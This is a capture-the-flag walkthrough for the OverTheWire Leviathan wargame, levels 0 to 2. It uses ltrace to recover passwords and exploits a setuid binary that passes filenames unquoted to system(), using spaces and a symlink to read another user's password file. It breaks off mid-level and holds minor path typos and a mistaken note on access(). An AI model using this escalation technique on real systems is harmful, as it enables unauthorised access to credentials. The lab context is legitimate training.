Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on leviathan.labs.overthewire.org through SSH on port 2223.

To login to the first level use:

Username: leviathan0
Password: leviathan0

Data for the levels can be found in the homedirectories. 
You can look at /etc/leviathan_pass for the various level passwords.

Level 0 -> Level 1: Show all files and grep through a file to parse out a password

Solution: cd into .backup to find an .html file, grep for leviathan

leviathan0@leviathan:~/.backup$ grep leviathan bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>

Level 1 -> Level 2
There is an executable file. Running it prompts for a password.
Inputting the wrong password gives 'Wrong password, bye!'

Solution: Follow the library calls for the executable with 'ltrace'.

leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd794, 0x8048610 <unfinished ...>
printf("password: ")                                                    = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password:
)                                   = 10
getchar(1, 0, 0x65766f6c, 0x646f6700
)                                   = 10
getchar(1, 0, 0x65766f6c, 0x646f6700
)                                   = 10
strcmp("\n\n\n", "sex")                                                 = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                    = 29
+++ exited (status 0) +++

Now we can run ./check and supply 'sex' as the password.
We are now leviathan2, and have permission to access the user password.
$ cat /etc/leviathan_pass/leviathan2

Level 2 -> Level 3
There is an execuatble file called 'printfile'.
Usage: ./printfile filename
./printfile foo >>> you cant have that file...
./printfile printfile crashes putty.
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass_leviathan2
You cant have that file...

Solution:

printfile is owned by leviathan3, and that may be exploitable

leviathan2@leviathan:~$ ls -l ~/printfile
-r-sr-x--- 1 leviathan3 leviathan2 7436 Oct 29  2018 /home/leviathan2/printfile

Make a temp dir with a test file to use in executable with 'ltrace'.

leviathan2@leviathan:~$ mkdir /tmp/droptables && echo "test" > /tmp/droptable/testFile.txt
leviathan2@leviathan:~$ ./printfile /tmp/droptables/testFile.txt
test
leviathan2@leviathan:~$ ltrace ./printfile /tmp/droptables/testFile.txt
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/tmp/droptables/testFile.txt", 4)        = 0
snprintf("/bin/cat /tmp/droptables/testFil"..., 511, "/bin/cat %s", "/tmp/droptables/testFile.txt") = 37
geteuid()                                        = 12002
geteuid()                                        = 12002
setreuid(12002, 12002)                           = 0
system("/bin/cat /tmp/droptables/testFil"...test
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++

The executable is owned by leviathan3, so the 'access()' call uses leviathan3's privaleges.
From 'snprintf', we see /bin/cat only calls PART of the file name.
What happens if we insert a space into the provided filename?

leviathan2@leviathan:~$ mv /tmp/droptables/testFile.txt /tmp/droptables/testF\ ile.txt
leviathan2@leviathan:~$ cd /tmp/droptables
leviathan2@leviathan:/tmp/droptables$ ls
testF ile.txt

./printfile reads a file with spaces as two seperate files.
Create a a symbolic link that links the first part of the file name to /etc/leviathan_pass/leviathan3
